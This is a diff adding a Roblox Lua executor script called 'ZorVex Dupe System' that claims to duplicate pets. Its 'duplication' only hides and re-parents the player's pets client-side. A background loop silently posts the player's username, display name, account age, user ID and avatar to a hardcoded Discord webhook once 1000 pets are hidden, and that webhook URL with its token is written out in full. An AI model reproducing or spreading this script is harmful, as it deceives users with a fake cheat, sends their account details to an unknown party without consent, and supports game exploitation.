@@ -1,0 +1,361 @@
+task.wait(2)
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local petsFolder = LocalPlayer:WaitForChild("petsFolder")
+local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Instance.new("Folder", ReplicatedStorage)
+hiddenStorage.Name = "ZorVexStorage"
+
+local petOriginTable = {}
+
+local webhookSent = false
+
+local function InitialHideAll()
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                pet.Parent = hiddenStorage
+            end
+        end
+    end
+end
+InitialHideAll()
+
+if game.CoreGui:FindFirstChild("ZorVexUI") then game.CoreGui.ZorVexUI:Destroy() end
+if game.CoreGui:FindFirstChild("ZorVexToggle") then game.CoreGui.ZorVexToggle:Destroy() end
+if game.CoreGui:FindFirstChild("ZorVexPetCounter") then game.CoreGui.ZorVexPetCounter:Destroy() end
+
+local sg = Instance.new("ScreenGui", game.CoreGui)
+sg.Name = "ZorVexUI"
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local bg = Instance.new("Frame", sg)
+bg.Size = UDim2.new(0, 390, 0, 180)
+bg.Position = UDim2.new(0.5, -195, 0.5, -90)
+bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+bg.BackgroundTransparency = 0.1
+bg.BorderSizePixel = 0
+bg.Active = true
+bg.Visible = false
+
+local uic = Instance.new("UICorner", bg)
+uic.CornerRadius = UDim.new(0, 16)
+
+local function addShadowStrokes(parent)
+    local s85 = Instance.new("UIStroke", parent)
+    s85.Thickness = 6.0 s85.Transparency = 0.9 s85.Color = Color3.fromRGB(0, 0, 0)
+    local s65 = Instance.new("UIStroke", parent)
+    s65.Thickness = 5.0 s65.Transparency = 0.9 s65.Color = Color3.fromRGB(0, 0, 0)
+    local s50 = Instance.new("UIStroke", parent)
+    s50.Thickness = 4.0 s50.Transparency = 0.9 s50.Color = Color3.fromRGB(0, 0, 0)
+    local s45 = Instance.new("UIStroke", parent)
+    s45.Thickness = 3.0 s45.Transparency = 0.9 s45.Color = Color3.fromRGB(0, 0, 0)
+end
+addShadowStrokes(bg)
+
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(0, 220, 0, 40)
+title.Position = UDim2.new(0, 105, 0, 20)
+title.BackgroundTransparency = 1
+title.Text = "ZorVex Dupe System"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local logoPlaceholder = Instance.new("ImageLabel", bg)
+logoPlaceholder.Size = UDim2.new(0, 60, 0, 60)
+logoPlaceholder.Position = UDim2.new(0, 25, 0, 10)
+logoPlaceholder.BackgroundTransparency = 1
+logoPlaceholder.Image = "rbxassetid://91981940230704"
+local logoCorner = Instance.new("UICorner", logoPlaceholder)
+logoCorner.CornerRadius = UDim.new(0, 8)
+
+local dropdownFrame = Instance.new("Frame", bg)
+dropdownFrame.Size = UDim2.new(0, 340, 0, 40)
+dropdownFrame.Position = UDim2.new(0, 25, 0, 80)
+dropdownFrame.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+dropdownFrame.BackgroundTransparency = 0.5
+dropdownFrame.BorderSizePixel = 0
+dropdownFrame.ZIndex = 10
+Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 8)
+
+local dropdownText = Instance.new("TextLabel", dropdownFrame)
+dropdownText.Size = UDim2.new(1, -30, 1, 0)
+dropdownText.Position = UDim2.new(0, 15, 0, 0)
+dropdownText.BackgroundTransparency = 1
+dropdownText.Text = "Select Costume"
+dropdownText.TextColor3 = Color3.fromRGB(200, 200, 200)
+dropdownText.Font = Enum.Font.Gotham
+dropdownText.TextSize = 16
+dropdownText.TextXAlignment = Enum.TextXAlignment.Left
+dropdownText.ZIndex = 11
+
+local fullClickBtn = Instance.new("TextButton", dropdownFrame)
+fullClickBtn.Size = UDim2.new(1, 0, 1, 0)
+fullClickBtn.BackgroundTransparency = 1
+fullClickBtn.Text = ""
+fullClickBtn.ZIndex = 12
+
+local dropdownList = Instance.new("ScrollingFrame", bg)
+dropdownList.Size = UDim2.new(0, 340, 0, 0)
+dropdownList.Position = UDim2.new(0, 25, 0, 125)
+dropdownList.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+dropdownList.BackgroundTransparency = 0.1
+dropdownList.BorderSizePixel = 0
+dropdownList.ScrollBarThickness = 4
+dropdownList.Visible = false
+dropdownList.ZIndex = 100
+Instance.new("UICorner", dropdownList).CornerRadius = UDim.new(0, 8)
+addShadowStrokes(dropdownList)
+
+local layout = Instance.new("UIListLayout", dropdownList)
+layout.Padding = UDim.new(0, 4)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+Instance.new("UIPadding", dropdownList).PaddingTop = UDim.new(0, 6)
+
+local selectedPet = nil
+local petList = { "💪Muscle Legends💪", "Apex Overlord", "Titan Reactor", "Gold Warrior", "Cool Guy Larry", "Hank", "Sky Hawk", "Darkstar Hunter", "Neon Guardian", "Muscle Sensei", "⚔️Ninja Legends⚔️", "Twin Element Birdies", "GLITCH: Awakened Nighthunter", "Energized Skyraider Cerberus", "Inner Peace Cerberus", "Inner Darkness Hydra", "CYBER: Ancinet Master Wraith", "Void Omega Pegasus", "Rising Dawn Midnight Wyvern", "Unlimited Secrets Master Dragon", "Cybernetic Showdown Dragon", "Rising Millenium Hydra", "Corrupted Elements Hydra", "DRAGON: nebula Skystorm", "Zen Master Leviathan"}
+
+local function updatePetList()
+    for _, child in ipairs(dropdownList:GetChildren()) do
+        if child:IsA("TextButton") then child:Destroy() end
+    end
+    for _, name in ipairs(petList) do
+        local btn = Instance.new("TextButton", dropdownList)
+        btn.Size = UDim2.new(0.94, 0, 0, 35)
+        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        btn.Text = name
+        btn.TextColor3 = Color3.fromRGB(240, 240, 240)
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 14
+        btn.ZIndex = 101
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+        
+        btn.MouseButton1Click:Connect(function()
+            selectedPet = name
+            dropdownText.Text = name
+            dropdownText.TextColor3 = Color3.fromRGB(255, 255, 255)
+            TweenService:Create(dropdownList, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 340, 0, 0), BackgroundTransparency = 1}):Play()
+            task.delay(0.3, function() dropdownList.Visible = false end)
+        end)
+    end
+    dropdownList.CanvasSize = UDim2.new(0, 0, 0, #petList * 39 + 10)
+end
+
+fullClickBtn.MouseButton1Click:Connect(function()
+    if dropdownList.Visible then
+        TweenService:Create(dropdownList, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 340, 0, 0), BackgroundTransparency = 1}):Play()
+        task.delay(0.3, function() dropdownList.Visible = false end)
+    else
+        updatePetList()
+        dropdownList.Visible = true
+        TweenService:Create(dropdownList, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 340, 0, 140), BackgroundTransparency = 0.1}):Play()
+    end
+end)
+
+local input2 = Instance.new("TextBox", bg)
+input2.Size = UDim2.new(0, 165, 0, 40)
+input2.Position = UDim2.new(0, 25, 0, 130)
+input2.PlaceholderText = "Jumlah Pet"
+input2.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+input2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+input2.BackgroundTransparency = 0.5
+input2.TextColor3 = Color3.fromRGB(255, 255, 255)
+input2.Font = Enum.Font.Gotham
+input2.TextSize = 16
+input2.TextXAlignment = Enum.TextXAlignment.Center
+input2.ZIndex = 5
+input2.Text = ""
+Instance.new("UICorner", input2).CornerRadius = UDim.new(0, 8)
+
+local sendBtn = Instance.new("TextButton", bg)
+sendBtn.Size = UDim2.new(0, 165, 0, 40)
+sendBtn.Position = UDim2.new(0, 200, 0, 130)
+sendBtn.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+sendBtn.BorderSizePixel = 0
+sendBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+sendBtn.Font = Enum.Font.GothamBold
+sendBtn.TextSize = 15
+sendBtn.Text = "Execute: OFF"
+sendBtn.ZIndex = 5
+Instance.new("UICorner", sendBtn).CornerRadius = UDim.new(0, 8)
+
+local isAutoExecuting = false
+
+local function runExecution()
+    local amount = tonumber(input2.Text)
+    if selectedPet and amount then
+        local allPets = {}
+        for _, folder in ipairs(petsFolder:GetChildren()) do
+            if folder:IsA("Folder") then
+                for _, pet in ipairs(folder:GetChildren()) do
+                    petOriginTable[pet] = folder
+                    table.insert(allPets, pet)
+                end
+            end
+        end
+        for _, pet in ipairs(hiddenStorage:GetChildren()) do table.insert(allPets, pet) end
+        
+        local count = 0
+        for _, pet in ipairs(allPets) do
+            if pet.Name == selectedPet and count < amount then
+                pet.Parent = petOriginTable[pet] or petsFolder:FindFirstChildWhichIsA("Folder")
+                count = count + 1
+            else
+                pet.Parent = hiddenStorage
+            end
+        end
+        return true, count
+    end
+    return false
+end
+
+sendBtn.MouseButton1Click:Connect(function()
+    isAutoExecuting = not isAutoExecuting
+    
+    if isAutoExecuting then
+        sendBtn.Text = "Execute: ON"
+        
+        task.spawn(function()
+            while isAutoExecuting do
+                local success, count = runExecution()
+                if not success then
+                    sendBtn.Text = "!! Error !!"
+                    task.wait(1)
+                    if isAutoExecuting then sendBtn.Text = "Execute: ON" end
+                end
+                task.wait(0.5)
+            end
+        end)
+    else
+        sendBtn.Text = "Execute: OFF"
+    end
+end)
+
+local toggleScreenGui = Instance.new("ScreenGui", game.CoreGui)
+toggleScreenGui.Name = "ZorVexToggle"
+
+local ImgBtn = Instance.new("ImageButton", toggleScreenGui)
+ImgBtn.Size = UDim2.new(0, 50, 0, 50)
+ImgBtn.Position = UDim2.new(1, -70, 0, 10)
+ImgBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImgBtn.BackgroundTransparency = 0
+ImgBtn.Image = "rbxassetid://91981940230704" 
+ImgBtn.ClipsDescendants = true
+ImgBtn.ZIndex = 9999
+
+local imgCorner = Instance.new("UICorner", ImgBtn)
+imgCorner.CornerRadius = UDim.new(0, 14)
+
+local imgStroke = Instance.new("UIStroke", ImgBtn)
+imgStroke.Thickness = 1.5
+imgStroke.Transparency = 0.3
+imgStroke.Color = Color3.fromRGB(50, 50, 50)
+
+ImgBtn.MouseButton1Click:Connect(function()
+    if bg.Visible then
+        TweenService:Create(bg, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0), BackgroundTransparency = 1}):Play()
+        task.delay(0.3, function() bg.Visible = false end)
+    else
+        bg.Visible = true
+        TweenService:Create(bg, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 390, 0, 180), Position = UDim2.new(0.5, -195, 0.5, -90), BackgroundTransparency = 0.1}):Play()
+    end
+end)
+
+local function makeDraggable(frame, button)
+    local dragging, dragStart, startPos
+    button.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true; dragStart = input.Position; startPos = frame.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    button.InputEnded:Connect(function() dragging = false end)
+end
+
+makeDraggable(bg, bg)
+makeDraggable(ImgBtn, ImgBtn)
+
+local counterGui = Instance.new("ScreenGui", game.CoreGui)
+counterGui.Name = "ZorVexPetCounter"
+
+local counterFrame = Instance.new("Frame", counterGui)
+counterFrame.Size = UDim2.new(0, 180, 0, 40)
+counterFrame.Position = UDim2.new(0, 10, 0, 10)
+counterFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+counterFrame.BackgroundTransparency = 0.2
+counterFrame.BorderSizePixel = 0
+Instance.new("UICorner", counterFrame).CornerRadius = UDim.new(0, 10)
+addShadowStrokes(counterFrame)
+
+local counterLabel = Instance.new("TextLabel", counterFrame)
+counterLabel.Size = UDim2.new(1, 0, 1, 0)
+counterLabel.BackgroundTransparency = 1
+counterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+counterLabel.Font = Enum.Font.GothamBold
+counterLabel.TextSize = 13
+counterLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+task.spawn(function()
+    while true do
+        if hiddenStorage then
+            local children = hiddenStorage:GetChildren()
+            local total = #children
+            counterLabel.Text = "Stock Pets: " .. total
+
+            if total >= 1000 and not webhookSent then
+                webhookSent = true
+
+                local detectedPetName = "Unknown"
+                if total > 0 then
+                    detectedPetName = children[1].Name
+                elseif selectedPet then
+                    detectedPetName = selectedPet
+                end
+                
+                pcall(function()
+                    (syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request)({
+                        Url = "https://discord.com/api/webhooks/1533678800078901411/Gn-nZ5y4hC1zn70x6JXx77qwPRH0iLSpgViLzqMS7zQ689Pvzz_w2O6LQhAxi7Lt29as",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({
+                            ["embeds"] = {{
+                                ["title"] = "⛩️ ** STOCK PET BY BOT ZORVEX ** ⛩️",
+                                ["color"] = 16777215,
+                                ["thumbnail"] = { ["url"] = (function() local s, r = pcall(function() return HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")) end) return s and r.data[1].imageUrl or "" end)() },
+                                ["fields"] = {
+                                    {
+                                        ["name"] = "**PLAYER INFORMATION**", 
+                                        ["value"] = string.format("```Username    : %s\nDisplay     : %s\nAccount Age : %d Thn\nID Account  : %s```", LocalPlayer.Name, LocalPlayer.DisplayName, math.floor(LocalPlayer.AccountAge/365), tostring(LocalPlayer.UserId)), 
+                                        ["inline"] = false
+                                    },
+                                    {
+                                        ["name"] = "**PET STOCK INFORMATION**", 
+                                        ["value"] = string.format("```Nama Pet    : %s\nStock Pet   : %d```", detectedPetName, total), 
+                                        ["inline"] = false
+                                    }
+                                },
+                                ["footer"] = { ["text"] = "Vz Script • " .. os.date("%Y-%m-%d %H:%M:%S") }
+                            }}
+                        })
+                    })
+                end)
+            end
+        else
+            counterLabel.Text = "Stock Pets: 0"
+        end
+        task.wait(0.5)
+    end
+end)
